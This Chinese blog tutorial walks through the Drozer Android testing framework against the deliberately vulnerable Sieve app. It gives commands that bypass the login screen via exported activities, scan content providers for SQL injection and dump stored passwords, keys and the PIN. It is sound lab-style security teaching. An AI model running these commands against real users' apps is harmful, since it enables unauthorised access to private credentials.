---
title: Drozer-Android安全测试
author: 简文涛
categories:
  - 信息安全
tags:
  - Android
comments: true
top: false
img: 'https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200824183447.png'
abbrlink: 4946
date:
updated:
summary:
---

## 1.Drozer简介

> drozer是一款针对Android系统的安全测试框架。drozer可以帮助App和设备变得更安全，其提供了很多Android平台下的渗透测试exploit供你使用和分享。对于远程的exploit，它可以生成shellcode帮助你进行远程设备管理。

## 2.环境配置

1.jdk1.6+
2.python2.7
3.android sdk
4.安装adb
5.模拟器也要安装drozer  agent
6.确保配置了adb、java环境变量

### 安装drozer

方法一：直接下载drozer

下载地址：https://labs.mwrinfosecurity.com/tools/drozer/ (下载drozer (RPM))，解压后drozer在`drozer\usr\bin`路径下

方法二：利用Appie里面带有的drozer

下载在appie解压后drozer在`Appie\base\`路径下

![](https://i.loli.net/2020/03/23/H1ubzFpkPylJ4OC.png)

### 模拟器安装agent.apk

将agent.apk下载后，通过cmd安装或者直接拖进模拟器进行安装

```bash
adb install 安装路径/agent.apk
```

### 模拟器安装sieve.apk
> sieve.apk为官网给的测试apk，上面自带各种漏洞，后面的案例以sieve.apk为例演示

将sieve.apk下载后，通过cmd安装或者直接拖进模拟器进行安装

```bash
adb install 安装路径/sieve.apk
```

## 3.连接mumu模拟器

打开cmd运行

```bash
adb connect 127.0.0.1:7555
```

![](https://i.loli.net/2020/03/23/rnxMjLdhG7XvFIQ.png)



## 4.进入Drozer控制台

首先要在mumu模拟器中打开drozer-agent

![](https://i.loli.net/2020/03/25/7rinHakSmXOCy1R.png)

然后使用 adb 进行端口转发，转发到上边Drozer使用的默认端口` 31415`，并进入Drozer 控制台

```bash
adb forward tcp:31415 tcp:31415

e:
cd Appie/base  //进入drozer的安装路径下
drozer console connect
```

<img src="https://i.loli.net/2020/03/23/esFra6tB3mGWNxw.png"  style="zoom: 50%;" />

看到如上显示，说明启动成功，下一步则可以进行测试

## 5.配置Siveve

> Sieve：一款Android安全测试APP

为了我们后面的安全案例讲解，我们需要先配置Sieve。
打开sieve，第一次进入需要输入16位的密码，提交后需要创建4位数的PIN
设置密码：1234567890123456
PIN：1399

进去功能界面，添加新的密码，邮箱；主要是为了往数据库添加数据，方便之后的攻击显示结果,，随便乱填就可以了。我添加了一个名为`jwt`的信息

![](https://i.loli.net/2020/03/25/mQ9vNdS4zGu5AhJ.png)

配置好就可以开始安全测试了

## 6.Drozer之sieve安全测试

### 6.1列出安装的所有应用包名

```bash
dz> run app.package.list
```

![](https://i.loli.net/2020/03/25/rgYaRcxUhIMVQp9.png)

**中文乱码解决方法：**

使用`run app.package.list`命令可能会出现中文乱码，下面是我在网上找的解决办法，找到下图路径下文件进行对应修改，就可以了。亲测有效！

![](https://i.loli.net/2020/03/25/WJugIejU8d79pyY.png)

![](https://i.loli.net/2020/03/25/PiK4G1xgjIaeZlC.png)

### 6.2利用关键词搜索得出包名

> run app.package.list -f  关键字

```bash
dz> run app.package.list -f sieve
com.mwr.example.sieve
```

### 6.3查看包的详细信息

```bash
dz> run app.package.info -a  com.mwr.example.sieve
```

![](https://i.loli.net/2020/03/23/1LSyKnO64iDM5pt.png)

通过上述方式，我们可以获得应用数据目录、apk的路径、UID、GID等信息。

### 6.4识别攻击面

```
dz> run app.package.attacksurface com.mwr.example.sieve 
```

![](https://i.loli.net/2020/03/25/tEFABOVJl52P6va.png)

这里我们发现有`3个activities，0个broadcast receivers,2个content providers，2个services exported`是导出的，这些都是潜在风险入口。

#### activities组件

应用程序中，一个Activity通常就是一个单独的界面，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。 Activity之间通过Intent进行通信。在Intent的描述结构中，有两个最重要的部分：动作和动作对应的数据。

#### broadcast组件

BroadcastReceive广播接收器应用可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice 来响应它们收到的信息，或者用NotificationManager来通知用户。通知可以用很多种方式来吸引用户的注意力──闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。

#### content 组件

android平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。这些数据可以存储在文件系统中、在一个SQLite数据库、或以任何其他合理的方式。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。只有需要在多个应用程序间共享数据是才需要内容提供者。

#### services组件

一个Service 是一段长生命周期的，没有用户界面的程序，可以用来开发如监控类程序。较好的一个例子就是一个正在从播放列表中播放歌曲的媒体播放器。在一个媒体播放器的应用中，应该会有多个activity，让使用者可以选择歌曲并播放歌曲。

### 6.5测试activities exported (绕过登陆验证)

```bash
dz> run app.activity.info -a com.mwr.example.sieve 
//显示暴露的Activity信息
```
![](https://i.loli.net/2020/03/25/VIjZwCiOTB6Qchp.png)

根据名称可以猜测出`.FileSelectActivity`可能是和文件有关，`.MainLoginActivity`就是主界面，`.PWList`可能和密码有关。

正常使用app需要输入PIN或者密码才能进去主界面，

![](https://i.loli.net/2020/03/25/UiW2CqJYlc3E4mG.png)

但是看到`FileSelectActivity`和`PWList`明显是登陆进去后的界面，这里我们可以直接调用此两个activity，从而绕过登陆验证。

```bash
dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList     //该命令会生成一个合适的intent来启动activity
```

运行之后可以直接进入到我们一开始配置的测试信息界面，绕过了登录验证

![](https://i.loli.net/2020/03/25/4Yc1fHxKX5NZsSr.png)

> 越权漏洞--绕过登录界面导致可直接访问Your Passwords界面，说明存在越权漏洞。

### 6.6测试 content provider(数据库泄露，sql注入等问题)

```bash
dz> run app.provider.info -a com.mwr.example.sieve     //列举Content Provider的信息
```

![](https://i.loli.net/2020/04/01/DhrXCIodKA6U3uZ.png)

```bash
dz> run app.provider.finduri com.mwr.example.sieve     //枚举uri
```

![](https://i.loli.net/2020/04/01/a6VeIRUypDYiCzQ.png)
列出了可访问内容URI的列表和路径

```bash
dz> run scanner.provider.finduris -a com.mwr.example.sieve     //使用扫描器枚举uri
```

![](https://i.loli.net/2020/04/01/QfLMEex1olyTF2O.png)

```bash
dz> run scanner.provider.injection -a com.mwr.example.sieve     //检测可利用uri，检查sql注入
```

![](https://i.loli.net/2020/04/01/OvqE4BKm1IRoV7A.png)

发现程序中存在三处注入

```bash
dz> run scanner.provider.sqltables -a  com.mwr.example.sieve //列出该app的表信息
```

![](https://i.loli.net/2020/04/01/adROPLf81oWsjnC.png)

```bash
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/     //获取数据库数据（即为之前保存的密码，邮箱信息）
```

![](https://i.loli.net/2020/04/01/p5lW2XtSJgCVAwG.png)

读取到Passwords表中的内容，可以看到用户名、密码、邮箱等信息

```bash
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --vertical     //竖直显示数据库数据password和pin码
```

![](https://i.loli.net/2020/04/01/UbapG4iVgA3W8oh.png)

读取到Key表中的内容,可以看到password和pin码

### 6.7利用广播接收器

```bash
run app.broadcast.info -a 
run app.broadcast.send --component   --extra   
run app.broadcast.sniff --action 
```
### 6.8开发服务

```bash
run app.service.info -a 
run app.service.start --action  --component  
run app.service.send   --msg    --extra    --bundle-as-obj
```





参考：[drozer之玩转sieve](https://blog.csdn.net/samlirongsheng/article/details/104926282)
参考：[安卓四大组件审计实验（drozer） ](https://www.sohu.com/a/226017569_354899)
参考：[Android安全测试框架Drozer（使用篇）](https://www.jianshu.com/p/dfa92bab3a55)
参考:[drozer-Android安全测试基本使用教程（Windows10）](https://blog.csdn.net/jianglianye21/article/details/80667346)
参考:官方指南（英文）[ Drozer 使用指南](https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-drozer-user-guide-2015-03-23.pdf)

